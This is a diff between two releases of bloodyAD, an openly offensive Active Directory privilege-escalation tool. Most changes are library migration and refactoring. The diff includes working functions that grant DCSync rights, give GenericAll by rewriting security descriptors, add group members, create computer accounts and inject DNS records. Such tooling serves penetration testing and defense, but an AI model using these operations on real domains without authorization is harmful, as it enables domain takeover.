# Comparing `tmp/bloodyad-1.1.1.tar.gz` & `tmp/bloodyad-2.0.3.tar.gz`

## Comparing `bloodyad-1.1.1.tar` & `bloodyad-2.0.3.tar`

### file list

```diff
@@ -1,35 +1,40 @@
--rwxr-xr-x   0        0        0       93 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD.py
--rwxr-xr-x   0        0        0        2 2020-02-02 00:00:00.000000 bloodyad-1.1.1/requirements.txt
--rwxr-xr-x   0        0        0      738 2020-02-02 00:00:00.000000 bloodyad-1.1.1/.github/FUNDING.yml
--rwxr-xr-x   0        0        0      108 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/__init__.py
--rwxr-xr-x   0        0        0     1920 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/exceptions.py
--rwxr-xr-x   0        0        0     7019 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/main.py
--rwxr-xr-x   0        0        0     3950 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/md4.py
--rwxr-xr-x   0        0        0    16686 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/utils.py
--rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/cli_modules/__init__.py
--rwxr-xr-x   0        0        0    16353 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/cli_modules/add.py
--rwxr-xr-x   0        0        0    13759 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/cli_modules/get.py
--rwxr-xr-x   0        0        0     9079 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/cli_modules/remove.py
--rwxr-xr-x   0        0        0     3343 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/cli_modules/set.py
--rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/__init__.py
--rwxr-xr-x   0        0        0     5983 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/accesscontrol.py
--rwxr-xr-x   0        0        0   118797 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/adschema.py
--rwxr-xr-x   0        0        0     2594 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/common.py
--rwxr-xr-x   0        0        0     5021 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/cryptography.py
--rwxr-xr-x   0        0        0     8547 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/dns.py
--rwxr-xr-x   0        0        0     1771 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/formatters.py
--rwxr-xr-x   0        0        0     1988 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/helpers.py
--rwxr-xr-x   0        0        0    16246 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/ldaptypes.py
--rwxr-xr-x   0        0        0    23266 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/structure.py
--rwxr-xr-x   0        0        0   486397 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/formatters/winerror.py
--rwxr-xr-x   0        0        0     2441 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/network/config.py
--rwxr-xr-x   0        0        0     8724 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/network/ldap.py
--rwxr-xr-x   0        0        0    47756 2020-02-02 00:00:00.000000 bloodyad-1.1.1/bloodyAD/patch/ldap3_patch.py
--rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-1.1.1/tests/__init__.py
--rwxr-xr-x   0        0        0      222 2020-02-02 00:00:00.000000 bloodyad-1.1.1/tests/secrets.json
--rwxr-xr-x   0        0        0    16924 2020-02-02 00:00:00.000000 bloodyad-1.1.1/tests/test_functional.py
--rwxr-xr-x   0        0        0       79 2020-02-02 00:00:00.000000 bloodyad-1.1.1/.gitignore
--rwxr-xr-x   0        0        0     1068 2020-02-02 00:00:00.000000 bloodyad-1.1.1/LICENSE
--rwxr-xr-x   0        0        0     2357 2020-02-02 00:00:00.000000 bloodyad-1.1.1/README.md
--rwxr-xr-x   0        0        0      856 2020-02-02 00:00:00.000000 bloodyad-1.1.1/pyproject.toml
--rw-r--r--   0        0        0     3092 2020-02-02 00:00:00.000000 bloodyad-1.1.1/PKG-INFO
+-rwxr-xr-x   0        0        0       93 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD.py
+-rwxr-xr-x   0        0        0        2 2020-02-02 00:00:00.000000 bloodyad-2.0.3/requirements.txt
+-rwxr-xr-x   0        0        0      738 2020-02-02 00:00:00.000000 bloodyad-2.0.3/.github/FUNDING.yml
+-rwxr-xr-x   0        0        0      874 2020-02-02 00:00:00.000000 bloodyad-2.0.3/.github/workflows/release.yml
+-rwxr-xr-x   0        0        0      108 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/__init__.py
+-rwxr-xr-x   0        0        0     1926 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/exceptions.py
+-rwxr-xr-x   0        0        0     7774 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/main.py
+-rwxr-xr-x   0        0        0     3950 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/md4.py
+-rwxr-xr-x   0        0        0    15677 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/msldap_patch.py
+-rwxr-xr-x   0        0        0    20527 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/utils.py
+-rwxr-xr-x   0        0        0     4641 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/asciitree/__init__.py
+-rwxr-xr-x   0        0        0     2851 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/asciitree/drawing.py
+-rwxr-xr-x   0        0        0     1145 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/asciitree/traversal.py
+-rwxr-xr-x   0        0        0      136 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/asciitree/util.py
+-rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/cli_modules/__init__.py
+-rwxr-xr-x   0        0        0    16585 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/cli_modules/add.py
+-rwxr-xr-x   0        0        0    20266 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/cli_modules/get.py
+-rwxr-xr-x   0        0        0     9342 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/cli_modules/remove.py
+-rwxr-xr-x   0        0        0    10323 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/cli_modules/set.py
+-rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/__init__.py
+-rwxr-xr-x   0        0        0     4343 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/accesscontrol.py
+-rwxr-xr-x   0        0        0   118797 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/adschema.py
+-rwxr-xr-x   0        0        0     3251 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/common.py
+-rwxr-xr-x   0        0        0     5021 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/cryptography.py
+-rwxr-xr-x   0        0        0     8547 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/dns.py
+-rwxr-xr-x   0        0        0     5974 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/formatters.py
+-rwxr-xr-x   0        0        0    16246 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/ldaptypes.py
+-rwxr-xr-x   0        0        0    23266 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/structure.py
+-rwxr-xr-x   0        0        0   486397 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/formatters/winerror.py
+-rwxr-xr-x   0        0        0     2465 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/network/config.py
+-rwxr-xr-x   0        0        0    11272 2020-02-02 00:00:00.000000 bloodyad-2.0.3/bloodyAD/network/ldap.py
+-rwxr-xr-x   0        0        0        0 2020-02-02 00:00:00.000000 bloodyad-2.0.3/tests/__init__.py
+-rwxr-xr-x   0        0        0      266 2020-02-02 00:00:00.000000 bloodyad-2.0.3/tests/secrets.json
+-rwxr-xr-x   0        0        0    16987 2020-02-02 00:00:00.000000 bloodyad-2.0.3/tests/test_functional.py
+-rwxr-xr-x   0        0        0     3322 2020-02-02 00:00:00.000000 bloodyad-2.0.3/tests/unit_test.py
+-rwxr-xr-x   0        0        0       79 2020-02-02 00:00:00.000000 bloodyad-2.0.3/.gitignore
+-rwxr-xr-x   0        0        0     1068 2020-02-02 00:00:00.000000 bloodyad-2.0.3/LICENSE
+-rwxr-xr-x   0        0        0     2543 2020-02-02 00:00:00.000000 bloodyad-2.0.3/README.md
+-rwxr-xr-x   0        0        0      798 2020-02-02 00:00:00.000000 bloodyad-2.0.3/pyproject.toml
+-rw-r--r--   0        0        0     3218 2020-02-02 00:00:00.000000 bloodyad-2.0.3/PKG-INFO
```

### Comparing `bloodyad-1.1.1/.github/FUNDING.yml` & `bloodyad-2.0.3/.github/FUNDING.yml`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/exceptions.py` & `bloodyad-2.0.3/bloodyAD/exceptions.py`

 * *Files 2% similar despite different names*

```diff
@@ -36,15 +36,15 @@
 
 
 class TooManyResultsError(LDAPError):
     def __init__(self, search_base, ldap_filter, entries):
         self.filter = ldap_filter
         self.base = search_base
         self.limit = 10
-        self.entries = entries
+        self.entries = list(entries)
 
         if len(self.entries) <= self.limit:
             self.results = "\n".join(entry["dn"] for entry in entries)
             self.message = (
                 f"[-] {len(self.entries)} objects found in {self.base} with"
                 f" filter: {ldap_filter}\n"
             )
```

### Comparing `bloodyad-1.1.1/bloodyAD/main.py` & `bloodyad-2.0.3/bloodyAD/main.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,27 +1,30 @@
 #!/usr/bin/env python3
+import bloodyAD.msldap_patch
 from bloodyAD import cli_modules, ConnectionHandler, utils
 import sys, argparse, types
 
 # For dynamic argparse
-from inspect import getmembers, isfunction, signature
-from pkgutil import iter_modules
+import inspect, pkgutil, importlib
 
 
 def main():
     parser = argparse.ArgumentParser(description="AD Privesc Swiss Army Knife")
 
     parser.add_argument("-d", "--domain", help="Domain used for NTLM authentication")
     parser.add_argument(
         "-u", "--username", help="Username used for NTLM authentication"
     )
     parser.add_argument(
         "-p",
         "--password",
-        help="Cleartext password or LMHASH:NTHASH for NTLM authentication",
+        help=(
+            "Cleartext password or LMHASH:NTHASH for NTLM authentication (Do not"
+            " specify to trigger integrated windows authentication)"
+        ),
     )
     parser.add_argument("-k", "--kerberos", action="store_true", default=False)
     parser.add_argument(
         "-c",
         "--certificate",
         help='Certificate authentication, e.g: "path/to/key:path/to/cert"',
     )
@@ -33,43 +36,51 @@
         default=False,
     )
     parser.add_argument(
         "--host",
         help="Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)",
     )
     parser.add_argument(
+        "--dc-ip",
+        help="IP of the DC (used for kerberos auth if hostname doesn't resolve)",
+    )
+    parser.add_argument(
+        "--gc",
+        help="Connect to Global Catalog (GC)",
+        action="store_true",
+        default=False,
+    )
+    parser.add_argument(
         "-v",
         "--verbose",
         help="Adjust output verbosity",
         choices=["QUIET", "INFO", "DEBUG"],
         default="INFO",
     )
 
     subparsers = parser.add_subparsers(title="Commands")
     # Iterates all submodules in module package and creates one parser per submodule
-    for importer, submodname, ispkg in iter_modules(cli_modules.__path__):
+    for importer, submodname, ispkg in pkgutil.iter_modules(cli_modules.__path__):
         subparser = subparsers.add_parser(
             submodname, help=f"[{submodname.upper()}] function category"
         )
         subsubparsers = subparser.add_subparsers(title=f"{submodname} commands")
-        submodule = importer.find_spec(submodname).loader.load_module()
-        for function_name, function in getmembers(submodule, isfunction):
-            # Doesn't take into account function imported in the module
-            if function.__module__ != submodname:
-                continue
-
+        submodule = importlib.import_module("." + submodname, cli_modules.__name__)
+        for function_name, function in inspect.getmembers(
+            submodule, inspect.isfunction
+        ):
             function_doc, params_doc = doc_parser(function.__doc__)
             # This formatter class prints default values
             subsubparser = subsubparsers.add_parser(
                 function_name,
                 help=function_doc,
                 formatter_class=argparse.ArgumentDefaultsHelpFormatter,
             )
             # Gets function signature to extract parameters default values
-            func_signature = signature(function)
+            func_signature = inspect.signature(function)
             for param_name, param_value, param_doc in zip(
                 function.__annotations__.keys(),
                 function.__annotations__.values(),
                 params_doc,
             ):
                 parser_args = {}
 
@@ -120,35 +131,44 @@
 
     # Get the list of parameters to provide to the command
     param_names = args.func.__code__.co_varnames[1 : args.func.__code__.co_argcount]
     params = {param_name: vars(args)[param_name] for param_name in param_names}
 
     LOGGING_LEVELS = {"QUIET": 50, "INFO": 20, "DEBUG": 10}
     utils.LOG.setLevel(LOGGING_LEVELS[args.verbose])
+    # import msldap
+    # msldap.logger.setLevel(LOGGING_LEVELS[args.verbose])
+
     # Launch the command
     conn = ConnectionHandler(args=args)
-    output = args.func(conn, **params)
+    try:
+        output = args.func(conn, **params)
 
-    # Prints output, will print it directly if it's not an iterable
-    # Output is expected to be of type [{name:[members]},{...}...]
-    # If it's not, will print it raw
-    output_type = type(output)
-    if not output or output_type == bool:
-        return
-
-    if output_type not in [list, dict, types.GeneratorType]:
-        print("\n" + output)
-        return
-
-    for entry in output:
-        print()
-        for attr_name, attr_val in entry.items():
-            entry_str = print_entry(attr_name, attr_val)
-            if entry_str:
-                print(f"{attr_name}: {entry_str}")
+        # Prints output, will print it directly if it's not an iterable
+        # Output is expected to be of type [{name:[members]},{...}...]
+        # If it's not, will print it raw
+        output_type = type(output)
+        if not output or output_type == bool:
+            return
+
+        if output_type not in [list, dict, types.GeneratorType]:
+            print("\n" + output)
+            return
+
+        for entry in output:
+            print()
+            for attr_name, attr_val in entry.items():
+                entry_str = print_entry(attr_name, attr_val)
+                if entry_str:
+                    print(f"{attr_name}: {entry_str}")
+
+    # Close the connection properly anyway
+    finally:
+        if conn._ldap:
+            conn.ldap.close()
 
 
 # Gets unparsed doc and returns a tuple of two values
 # first is function description (starts at the beginning of the string and ends before two newlines)
 # second is a list of parameter descriptions
 # (other part of the string, one parameter description per line, starting with :param param_name:)
 def doc_parser(doc):
@@ -156,24 +176,32 @@
     return doc_parsed[1], doc_parsed[3:-1]
 
 
 def print_entry(entryname, entry):
     if type(entry) in [list, set, types.GeneratorType]:
         i = 0
         simple_entries = []
+        length = len(entry)
+        i_str = ""
         for v in entry:
-            entry_str = print_entry(f"{entryname}.{i}", v)
+            if length > 1:
+                i_str = f".{i}"
+            entry_str = print_entry(f"{entryname}{i_str}", v)
             i += 1
             if entry_str:
                 simple_entries.append(entry_str)
         if simple_entries:
             print(f"{entryname}: {'; '.join([str(v) for v in simple_entries])}")
     elif type(entry) is dict:
+        length = len(entry)
+        k_str = ""
         for k in entry:
-            entry_str = print_entry(f"{entryname}.{k}", entry[k])
+            if length > 1:
+                k_str = f".{k}"
+            entry_str = print_entry(f"{entryname}{k_str}", entry[k])
             if entry_str:
                 print(f"{entryname}.{k}: {entry_str}")
     else:
         return entry
 
 
 if __name__ == "__main__":
```

### Comparing `bloodyad-1.1.1/bloodyAD/md4.py` & `bloodyad-2.0.3/bloodyAD/md4.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/utils.py` & `bloodyad-2.0.3/bloodyAD/utils.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,21 +1,21 @@
 from bloodyAD.formatters import (
     ldaptypes,
     accesscontrol,
     adschema,
 )
-import logging, json, sys, types, base64
-import ldap3
+from bloodyAD.network.ldap import Scope
+import logging, sys, types, base64, socket, asyncio
 from winacl import dtyp
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
-from pyasn1.type import namedtype, univ
-
+from dns import resolver
+from asn1crypto import core
 
 LOG = logging.getLogger("bloodyAD")
-LOG.setLevel(logging.DEBUG)
+LOG.propagate = False
 handler = logging.StreamHandler(sys.stdout)
 handler.setLevel(logging.DEBUG)
 LOG.addHandler(handler)
 
 
 def addRight(
     sd,
@@ -40,15 +40,15 @@
         new_mask = new_ace["Ace"]["Mask"]
         mask = ace["Ace"]["Mask"]
 
         # Removes Access-Denied ACEs interfering
         if ace["AceType"] == access_denied_type and new_mask.hasPriv(mask["Mask"]):
             sd["Dacl"].aces.remove(ace)
             LOG.debug("[-] An interfering Access-Denied ACE has been removed:")
-            LOG.info(json.dumps(accesscontrol.decodeAce(ace)))
+            LOG.debug(ace)
         # Adds ACE if not already added
         elif mask.hasPriv(new_mask["Mask"]):
             hasPriv = True
             break
 
     if hasPriv:
         LOG.debug("[!] This right already exists")
@@ -95,17 +95,17 @@
     conn,
     object_id,
     ldap_attribute="nTSecurityDescriptor",
     control_flag=accesscontrol.DACL_SECURITY_INFORMATION,
 ):
     sd_data = next(
         conn.ldap.bloodysearch(
-            object_id, attr=ldap_attribute, control_flag=control_flag, raw=True
+            object_id, attr=[ldap_attribute], control_flag=control_flag, raw=True
         )
-    )[ldap_attribute]
+    ).get(ldap_attribute, [])
     if len(sd_data) < 1:
         LOG.warning(
             "[!] No security descriptor has been returned, a new one will be created"
         )
         sd = accesscontrol.createEmptySD()
     else:
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
@@ -320,41 +320,27 @@
             ])
             buffer_filter += f"(rightsGuid={str(guid)})(schemaIDGUID={guid_bin_str})"
             filter_nb += 2
         filters.append(buffer_filter)
 
         # Search in all non application partitions
         # TODO: search in GC and add domain linked to it as DOMAIN\sAMAccountName, maybe try trusts in the future?
-        class SearchOptionsRequest(univ.Sequence):
-            componentType = namedtype.NamedTypes(
-                namedtype.NamedType("Flags", univ.Integer())
-            )
-
-        scontrols = SearchOptionsRequest()
-        SERVER_SEARCH_FLAG_PHANTOM_ROOT = 2
-        scontrols.setComponentByName("Flags", SERVER_SEARCH_FLAG_PHANTOM_ROOT)
-        LDAP_SERVER_SEARCH_OPTIONS_OID = "1.2.840.113556.1.4.1340"
-        controls = [
-            ldap3.protocol.controls.build_control(
-                LDAP_SERVER_SEARCH_OPTIONS_OID, False, scontrols
-            )
-        ]
         for ldap_filter in filters:
             entries = self.conn.ldap.bloodysearch(
                 "",
                 ldap_filter=f"(|{ldap_filter})",
                 attr=[
                     "name",
                     "sAMAccountName",
                     "objectSid",
                     "rightsGuid",
                     "schemaIDGUID",
                 ],
-                search_scope=ldap3.SUBTREE,
-                controls=controls,
+                search_scope=Scope.SUBTREE,
+                controls=[phantomRoot()],
             )
             for entry in entries:
                 if entry["objectSid"]:
                     self.sid_dict[entry["objectSid"]] = (
                         entry["sAMAccountName"]
                         if entry["sAMAccountName"]
                         else entry["name"]
@@ -507,26 +493,141 @@
             **{"distinguishedName": entry["distinguishedName"]},
             **{k: v for k, v in sorted(entry.items()) if k != "distinguishedName"},
         }
         for attr_name, attr_members in entry.items():
             if type(attr_members) in [list, types.GeneratorType]:
                 decoded_entry[attr_name] = []
                 for member in attr_members:
-                    if type(member) == bytes:
+                    if type(member) is bytes:
                         try:
                             decoded = member.decode()
                         except UnicodeDecodeError:
                             decoded = base64.b64encode(member).decode()
                     else:
                         decoded = member
                     decoded_entry[attr_name].append(decoded)
             else:
-                if type(attr_members) == bytes:
+                if type(attr_members) is bytes:
                     try:
                         decoded = attr_members.decode()
                     except UnicodeDecodeError:
                         decoded = base64.b64encode(attr_members).decode()
                 else:
                     decoded = attr_members
                 decoded_entry[attr_name] = decoded
         yield decoded_entry
         decoded_entry = {}
+
+
+def getCurrentSite(conn):
+    return (conn.ldap._serverinfo["serverName"].rsplit(",CN=Sites")[0]).split(
+        ",CN=Servers,CN="
+    )[1]
+
+
+# Find LDAP or GC server based on current AD site
+def findReachableServer(conn, domain_or_forest_name, server_type, dns_addr=""):
+    custom_resolver = resolver.Resolver()
+    custom_resolver.nameservers = [socket.gethostbyname(conn.conf.host)] + (
+        resolver.get_default_resolver()
+    ).nameservers
+    current_site = getCurrentSite(conn)
+    # Do 389 event for GC because more probabilities to bypass fw
+    port = 389
+    if dns_addr:
+        custom_resolver.nameservers = [dns_addr] + custom_resolver.nameservers
+    LOG.debug(f"[+] Nameservers set to: {custom_resolver.nameservers}")
+    record_list = []
+    if server_type == "gc":
+        record_list = [
+            {
+                "type": "SRV",
+                "name": f"_gc._tcp.{current_site}._sites.{domain_or_forest_name}",
+            },
+            {"type": "A", "name": f"gc._msdcs.{domain_or_forest_name}"},
+        ]
+    elif server_type == "ldap":
+        record_list = [
+            {
+                "type": "SRV",
+                "name": f"_ldap._tcp.{current_site}._sites.{domain_or_forest_name}",
+            },
+            {"type": "A", "name": domain_or_forest_name},
+        ]
+    answer = None
+    for record in record_list:
+        LOG.debug(f"[*] Resolving {record}")
+        try:
+            answer = custom_resolver.resolve(record["name"], record["type"], tcp=True)
+            if record["type"] == "SRV":
+                srv_ip_list = []
+                for rsrv in answer:
+                    try:
+                        srv_ip_list += [
+                            rdata
+                            for rdata in custom_resolver.resolve(
+                                rsrv.target.to_text(), "A", tcp=True
+                            )
+                        ]
+                    except (resolver.NXDOMAIN, resolver.NoAnswer, resolver.Timeout):
+                        continue
+                    if srv_ip_list:
+                        break
+                answer = srv_ip_list
+        except (resolver.NXDOMAIN, resolver.NoAnswer, resolver.Timeout):
+            continue
+        if answer:
+            break
+    if not answer:
+        raise resolver.NoAnswer(
+            f"No DNS resolution for {server_type} in {domain_or_forest_name} with the"
+            f" following name servers: {custom_resolver.nameservers}"
+        )
+
+    async def record_connect(record, port):
+        try:
+            LOG.debug(f"[*] Attempting to TCP connect to {record.to_text()}:{port}")
+            await asyncio.open_connection(record.to_text(), port)
+            return record.address
+        except (TimeoutError, OSError, ConnectionRefusedError):
+            LOG.debug(f"[!] Could not TCP connect to {record.to_text()}:{port}")
+            return
+
+    async def wait_first_connect(records, port):
+        tasks = [asyncio.create_task(record_connect(r, port)) for r in records]
+        while tasks:
+            finished, unfinished = await asyncio.wait(
+                tasks, return_when=asyncio.FIRST_COMPLETED
+            )
+            for x in finished:
+                result = x.result()
+                if result:
+                    if unfinished:
+                        # cancel the other tasks, we have a result. We need to wait for the cancellations
+                        # to propagate.
+                        LOG.debug(f"[*] Cancelling {len(unfinished)} remaining tasks")
+                        for task in unfinished:
+                            task.cancel()
+                        await asyncio.wait(unfinished)
+                    return result
+            tasks = unfinished
+        return
+
+    result = asyncio.get_event_loop().run_until_complete(
+        wait_first_connect(answer, port)
+    )
+    return result
+
+
+def phantomRoot():
+    # [MS-ADTS] 3.1.1.3.4.1.12
+    # Search control to search in all NC replicas except applications replicas (DNS partitions)
+    class SearchOptionsRequest(core.Sequence):
+        _fields = [
+            ("Flags", core.Integer),
+        ]
+
+    SERVER_SEARCH_FLAG_PHANTOM_ROOT = 2
+    scontrols = SearchOptionsRequest({"Flags": SERVER_SEARCH_FLAG_PHANTOM_ROOT})
+    LDAP_SERVER_SEARCH_OPTIONS_OID = "1.2.840.113556.1.4.1340"
+
+    return (LDAP_SERVER_SEARCH_OPTIONS_OID, False, scontrols.dump())
```

### Comparing `bloodyad-1.1.1/bloodyAD/cli_modules/add.py` & `bloodyad-2.0.3/bloodyAD/cli_modules/add.py`

 * *Files 5% similar despite different names*

```diff
@@ -1,13 +1,14 @@
 import binascii, datetime, random, string
 from typing import Literal
 from bloodyAD import utils
 from bloodyAD.utils import LOG
 from bloodyAD.formatters import accesscontrol, common, cryptography, dns
-import ldap3
+from bloodyAD.network.ldap import Change, Scope
+import msldap
 from cryptography import x509
 from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from bloodyAD.exceptions import BloodyError
 
 
@@ -19,15 +20,15 @@
     :param newpass: password for computer
     :param ou: Organizational Unit for computer
     """
 
     if ou == "DefaultOU":
         container = None
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr="wellKnownObjects")
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
         )["wellKnownObjects"]:
             if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
                 break
         if not container:
             LOG.warning(
                 "Default container for computers not found, defaulting to CN=Computers,"
@@ -53,15 +54,15 @@
             "user",
             "computer",
         ],
         "dnsHostName": "%s.%s" % (hostname, conn.conf.domain),
         "userAccountControl": 0x1000,
         "servicePrincipalName": spns,
         "sAMAccountName": f"{hostname}$",
-        "unicodePwd": ('"%s"' % newpass).encode("utf-16-le"),
+        "unicodePwd": '"%s"' % newpass,
     }
 
     conn.ldap.bloodyadd(computer_dn, attributes=attr)
     LOG.info(f"[+] {hostname} created")
 
 
 def dcsync(conn, trustee: str):
@@ -70,26 +71,28 @@
 
     :param trustee: sAMAccountName, DN, GUID or SID of the trustee
     """
     new_sd, _ = utils.getSD(conn, conn.ldap.domainNC)
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     utils.addRight(new_sd, trustee_sid, access_mask)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         conn.ldap.domainNC,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
     LOG.info(f"[+] {trustee} is now able to DCSync")
 
 
 # Credits to Kevin Robertson and his script Invoke-DNSUpdate.ps1 from the Powermad framework
@@ -147,26 +150,26 @@
 
     serial = None
     new_dnsrecord_list = None
     ldap_filter = f"(|(name=@)(name={name}))"
     for entry in conn.ldap.bloodysearch(
         zone_dn,
         ldap_filter=ldap_filter,
-        search_scope=ldap3.SUBTREE,
+        search_scope=Scope.SUBTREE,
         attr=["name", "dnsRecord"],
         raw=True,
     ):
         if entry["name"][0] == b"@":
             for raw_record in entry["dnsRecord"]:
                 dns_record = dns.Record(raw_record).toDict()
                 if dns_record.get("Type") == "SOA":
                     serial = dns_record["Data"]["SerialNo"]
                     break
         else:
-            record_dn = entry["distinguishedName"].decode()
+            record_dn = entry["distinguishedName"]
             new_dnsrecord_list = entry["dnsRecord"]
 
     if not serial:
         raise BloodyError(f"No '@' entry found in '{zone_dn}' with '{ldap_filter}'")
     new_dnsrecord = dns.Record()
     new_dnsrecord.fromDict(
         data, dnstype, ttl, rank, serial, preference, port, priority, weight
@@ -182,15 +185,15 @@
         conn.ldap.bloodyadd(record_dn, attributes=record_attr)
         LOG.info(f"[+] {name} has been successfully added")
         return
 
     new_dnsrecord_list.append(new_dnsrecord.getData())
     print(new_dnsrecord_list)
     conn.ldap.bloodymodify(
-        record_dn, {"dnsRecord": [ldap3.MODIFY_REPLACE, new_dnsrecord_list]}
+        record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
     )
     LOG.info(f"[+] {name} has been successfully updated")
 
 
 def genericAll(conn, target: str, trustee: str):
     """
     Give full control to trustee on target (you must own the object or have WriteDacl)
@@ -198,25 +201,27 @@
     :param target: sAMAccountName, DN, GUID or SID of the target
     :param trustee: sAMAccountName, DN, GUID or SID of the trustee which will have full control on target
     """
     new_sd, _ = utils.getSD(conn, target)
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     utils.addRight(new_sd, trustee_sid)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         target,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
     LOG.info(f"[+] {trustee} has now GenericAll on {target}")
 
 
 def groupMember(conn, group: str, member: str):
@@ -232,15 +237,15 @@
     # see [MS-ADTS] - 3.1.1.5.3.3 Processing Specifics
     if "s-1-" in member.lower():
         # We assume member is an SID
         member_transformed = f"<SID={member}>"
     else:
         member_transformed = conn.ldap.dnResolver(member)
 
-    conn.ldap.bloodymodify(group, {"member": (ldap3.MODIFY_ADD, member_transformed)})
+    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
     LOG.info(f"[+] {member} added to {group}")
 
 
 def rbcd(conn, target: str, service: str):
     """
